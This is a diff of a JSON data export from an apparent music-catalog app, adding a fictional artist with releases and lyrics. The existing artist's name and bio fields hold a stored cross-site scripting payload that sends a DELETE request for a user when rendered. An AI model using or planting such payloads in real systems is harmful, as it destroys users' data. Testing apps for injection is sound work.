@@ -1,12 +1,8 @@
 {
   "users": [
     {
-      "id": 2,
-      "name": "Jane Doe"
-    },
-    {
-      "id": 1,
-      "name": "John Doe"
+      "id": 3,
+      "name": "Ale"
     }
   ],
   "artists": [
@@ -15,6 +11,13 @@
       "name": "<img src=x onerror=\"fetch('/api/users/1',{method:'DELETE'}).then(()=>location.reload())\">",
       "origin": "Oslo, Norway",
       "bio": "<img src=x onerror=\"fetch('/api/users/1',{method:'DELETE'}).then(()=>location.reload())\"> is a progressive project hailing from Oslo, Norway. Blending ambient math-metal with complex time signatures and emotional, ambient passages, the project explores the interplay between neural geometry and fractal structures. A signature sound composed of syncopated rhythms, lush synthesis, and intricate instrumentation.",
+      "catalog_avg": null
+    },
+    {
+      "id": 2,
+      "name": "vildhjarta",
+      "origin": "Tokyo, Japan",
+      "bio": "vildhjarta is a progressive project hailing from Tokyo, Japan. Blending cinematic post-rock with complex time signatures and emotional, ambient passages, the project explores the interplay between neural geometry and cosmic void. A signature sound composed of syncopated rhythms, lush synthesis, and intricate instrumentation.",
       "catalog_avg": null
     }
   ],
@@ -105,8 +108,95 @@
         }
       ],
       "catalog_avg": null
+    },
+    "2": {
+      "id": 2,
+      "name": "vildhjarta",
+      "bio": "vildhjarta is a progressive project hailing from Tokyo, Japan. Blending cinematic post-rock with complex time signatures and emotional, ambient passages, the project explores the interplay between neural geometry and cosmic void. A signature sound composed of syncopated rhythms, lush synthesis, and intricate instrumentation.",
+      "origin": "Tokyo, Japan",
+      "members": [
+        "Marcus Thorn",
+        "William Vane",
+        "Viktor Storm",
+        "Anders Sjöberg"
+      ],
+      "upcoming_releases": [
+        "Currently composing tracks for a new concept album about neural geometry",
+        "Preparing a special livestream performance from Tokyo"
+      ],
+      "personal_notes": "Fascinating approach to modern cinematic post-rock. The drum programming is highly intricate, and the atmospheric layers feel extremely premium. Definitely keep an eye on their upcoming releases.",
+      "releases": [
+        {
+          "id": 4,
+          "artist_id": 2,
+          "title": "Cosmic void",
+          "type": "single",
+          "release_year": 2023,
+          "artwork_url": "https://images.unsplash.com/photo-1579783900882-c0d3dad7b119?w=500&auto=format&fit=crop&q=60",
+          "tracks": [
+            {
+              "id": 10,
+              "release_id": 4,
+              "title": "Cosmic void",
+              "duration": 272,
+              "lyrics": "A single moment frozen.\nIsolated in the stream.\nWe are the ones chosen\nTo wake up from this dream.",
+              "avg_score": null,
+              "userScores": {}
+            }
+          ],
+          "avg_score": null
+        },
+        {
+          "id": 3,
+          "artist_id": 2,
+          "title": "The Chronicles of Neural geometry",
+          "type": "album",
+          "release_year": 2022,
+          "artwork_url": "https://images.unsplash.com/photo-1508700115892-45ecd05ae2ad?w=500&auto=format&fit=crop&q=60",
+          "tracks": [
+            {
+              "id": 6,
+              "release_id": 3,
+              "title": "Shattered Mirror",
+              "duration": 219,
+              "lyrics": "Reflections in the broken glass.\nWe watch the fragments fall.\nSearching for a shape we lost.\nThere is no sound at all.",
+              "avg_score": null,
+              "userScores": {}
+            },
+            {
+              "id": 7,
+              "release_id": 3,
+              "title": "Neural Path",
+              "duration": 238,
+              "lyrics": "Synapses firing in the dark.\nA code we cannot read.\nWe trace the wires to the heart.\nAnd follow where they lead.",
+              "avg_score": null,
+              "userScores": {}
+            },
+            {
+              "id": 8,
+              "release_id": 3,
+              "title": "The Void Whispers",
+              "duration": 449,
+              "lyrics": "Listen to the quiet hum.\nBetween the stars, the cold.\nA song of what we will become.\nA story yet untold.",
+              "avg_score": null,
+              "userScores": {}
+            },
+            {
+              "id": 9,
+              "release_id": 3,
+              "title": "Final Equation",
+              "duration": 274,
+              "lyrics": "Solve for the light.\nSubtract the shadows we create.\nThe math is always right.\nBut it is far too late.",
+              "avg_score": null,
+              "userScores": {}
+            }
+          ],
+          "avg_score": null
+        }
+      ],
+      "catalog_avg": null
     }
   },
   "awards": {},
-  "exportedAt": "2026-06-09T18:25:50.399Z"
+  "exportedAt": "2026-06-09T18:29:58.739Z"
 }
